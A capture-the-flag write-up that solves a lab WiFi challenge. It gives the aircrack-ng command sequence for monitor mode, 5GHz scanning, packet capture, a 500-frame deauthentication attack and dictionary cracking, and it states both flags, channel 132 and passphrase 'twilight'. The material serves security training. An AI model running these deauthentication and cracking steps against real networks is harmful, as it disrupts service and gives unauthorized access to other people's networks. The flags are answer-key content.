# Wifi Security

- Category: Wifi 
- Points: 100

## Challenge Description:
```
A dual-band WiFi interface is available in the lab machine. There is a WiFi network operating in the vicinity of the lab machine. 

Answer the following questions:

    1. The WiFi network is operating on which channel? Provide channel number.
    2. What is the secret passphrase of that WiFi network? 

Instructions: 
- The password dictionary "100-common-passwords.txt" is kept in the home directory of root user (i.e. /root/)
- Aircrack-ng suite is installed on the machine
```

## Solution:

### Tool used:
- `aircrack-ng` suite

First, we need to set our interface to monitor mode

We can do so by running:

`iw dev wlan0 set monitor none`
*no need to run with sudo as we are root!*

Next, we need to scan for wifi! 

`airodump-ng wlan0`

However, as it is a 5GHz network, and airodump-ng does not scan for 5Ghz channels by default, we need to include the -b a flag (sets the band to scan in ac mode (802.11ac - 2.4GHz **and** 5GHz))

`airodump-ng wlan0 -b a`

We find the wifi network broadcasting on `channel 132`, which gives us the first flag.

Next, we need to focus on that specific network, and do a network capture

```sh 
airodump-ng --bssid A2:E7:5C:D3:F7:20 -c 132 --output-format pcap -w AAAA wlan0
```

However, it is here that we hit our first roadblock. 

I need to capture network while interacting with said network (with this command: `aireplay-ng --deauth 500 -a A2:E7:5C:D3:F7:20 wlan0`) ~~, and since I did not have access to tmux or GNU Screen, I had to get creative with running commands in the background!~~ (I later realised that creating more tabs would run on the same instance...so this was completly unnecssary as it created background processes that I had to manually kill)

```sh
airodump-ng --bssid A2:E7:5C:D3:F7:20 -c 132 --output-format pcap -w AAAA wlan0 & aireplay-ng  --deauth 500 -a A2:E7:5C:D3:F7:20 wlan0
```

 936420After about a minute, I get a pcap file! Which we can then crack with aircrack-ng (and the provided `100-common-passwords.txt` file)!

```sh
aircrack-ng AAAA-01.cap -w ./100-common-passwords.txt
```

We can then get the password 'twilight' from aircrack!


### Reference: 
https://securethelogs.com/2019/08/09/cracking-wireless-passwords-with-aircrack-ng/

## Flags:
1. 132
2. twilight